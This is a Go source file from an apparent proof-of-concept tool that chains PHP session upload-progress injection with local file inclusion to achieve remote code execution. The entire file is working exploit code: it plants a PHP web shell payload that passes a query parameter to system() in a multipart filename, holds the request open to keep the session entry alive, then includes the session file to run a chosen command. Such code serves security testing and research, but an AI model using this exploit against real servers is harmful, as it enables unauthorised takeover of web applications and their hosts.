package verify

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"strconv"
	"time"

	"github.com/eltonlaice/php2shell-poc/internal/mp"
)

// ChainA verifies the session file injection plus LFI chain.
//
// It writes PHP code into the upload-progress session entry through a
// multipart filename, then includes the session file through an application
// LFI sink. A target is only "OK" when the command output appears between the
// two markers.
func ChainA(ctx context.Context, opt Options) (Result, error) {
	res := Result{Chain: "A", Summary: "not confirmed"}
	if err := checkTarget(opt); err != nil {
		return res, err
	}
	cl := opt.client()
	sid := newSID()

	payload := `<?php echo 'P2S_A_START'; system($_GET['cmd']); echo 'P2S_A_END'; ?>`
	fileValue := []byte("Z")
	if opt.Stall {
		// A few KiB of file data makes the SAPI emit an upload-progress
		// update (and therefore persist the session entry) while the
		// request is still open.
		fileValue = bytes.Repeat([]byte("Z"), 8192)
	}
	b := mp.New()
	parts := []mp.Part{
		{Name: "PHPSESSID", Value: []byte(sid)},
		{Name: "PHP_SESSION_UPLOAD_PROGRESS", Value: []byte("p2s")},
		{Name: "f", Filename: payload, Value: fileValue},
	}
	injectURL, err := urlFor(opt.Target, opt.InjectPath)
	if err != nil {
		return res, err
	}
	file := opt.SessionDir + "/sess_" + sid
	lfi, err := lfiURL(opt.Target, opt.LFIPath, file, opt.Command)
	if err != nil {
		return res, err
	}

	var conn net.Conn
	if opt.Stall {
		prefix, err := b.BytesHead(parts...)
		if err != nil {
			return res, err
		}
		// Declare more body than we send so the worker keeps the request
		// (and its upload-progress session entry) alive.
		conn, err = cl.Stall(injectURL, b.ContentType(), int64(len(prefix))+1<<20, prefix, nil)
		if err != nil {
			return res, fmt.Errorf("chain A: stalled inject: %w", err)
		}
		defer conn.Close()
	} else {
		body, err := b.Bytes(parts...)
		if err != nil {
			return res, err
		}
		resp, err := cl.Post(injectURL, body, b.ContentType(), nil)
		if err != nil {
			return res, fmt.Errorf("chain A: inject: %w", err)
		}
		res.Evidence = append(res.Evidence, "inject POST -> "+strconv.Itoa(resp.Status))
	}

	if opt.Stall {
		// Give the SAPI a moment to parse the filename and create the entry.
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		case <-time.After(opt.StallWait):
		}
	}

	resp, err := cl.Get(lfi, nil)
	if err != nil {
		return res, fmt.Errorf("chain A: LFI request: %w", err)
	}
	res.Evidence = append(res.Evidence, fmt.Sprintf("LFI GET %s -> %d", file, resp.Status))

	out, ok := between(resp.Body, "P2S_A_START", "P2S_A_END")
	if ok {
		res.OK = true
		res.Summary = "RCE confirmed (session injection + LFI): " + out
		res.Evidence = append(res.Evidence, "command output: "+strconv.Quote(out))
		return res, nil
	}
	res.Notes = append(res.Notes,
		"no marker in response: check the LFI path, session.save_path and whether upload_progress.cleanup is On (use --stall)",
		"response: "+snippet(resp.Body, 180),
	)
	return res, nil
}
